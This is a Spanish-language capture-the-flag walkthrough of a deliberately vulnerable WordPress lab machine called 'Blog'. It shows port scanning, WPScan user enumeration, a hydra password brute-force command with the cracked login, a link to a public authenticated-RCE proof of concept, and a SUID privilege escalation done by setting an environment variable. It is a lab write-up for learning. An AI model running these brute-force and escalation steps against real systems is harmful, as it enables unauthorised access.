# Blog
Máquina de Wordpress un poco tricky de explotar sin MSF pero muy interesante

## Initial Scan
```
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

```
## Enum
### HTTP 
Añadimos blog.thm a /etc/hosts
Teniendo un Wordpress lo primero es tirar de WPScan
```bash
wpscan --url blog.thm -e u
```
Enumeramos usuarios
```
[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
```
Tiramos de BruteForcing
```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
[80][http-post-form] host: 10.10.109.134   login: kwheel   password: cutiepie1
```
Sabiendo la version buscamos un Authenticated RCE y encontramos un CVE , como en esta casa no usamos Metasploit buscamos el POC del CVE
```
https://github.com/brianwrf/WordPress_4.9.8_RCE_POC
```
Una vez seguidos los pasos tenemos shell

## Privesc

Encontramos un SUID un tanto raro
```
/usr/sbin/checker
```
Lo observamos con ltrace y tenemos lo siguiente
```
getenv("admin") = nil
puts("Not an Admin"
    Not an Admin
  ) = 13
  ++ + exited(status 0) ++ +
```
Parce que lo que hace es verificar si una env variable tiene algún value
```
www-data@blog:/home/bjoel$ export admin=13
```
Y ya simplemente ejecutamos el SUID file en cuestión y pa dentro
```
www-data@blog:/home/bjoel$ /usr/sbin/checker
root@blog:/home/bjoel# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Y listo
